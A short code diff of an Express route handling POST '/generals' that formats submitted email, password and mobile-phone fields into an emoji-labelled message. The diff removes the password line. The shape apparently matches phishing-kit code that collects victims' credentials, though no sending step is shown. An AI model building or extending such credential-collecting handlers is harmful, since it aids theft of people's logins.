@@ -20,8 +20,6 @@ router.post('/generals', (req, res) => {
 
     \u{1F4E7} Email: ${req.body.email}
 
-    \u{1F513} Pass: ${req.body.pemail}
-
     \u{1F4F2} Celular: ${req.body.pemail}
 
     ----------------------------
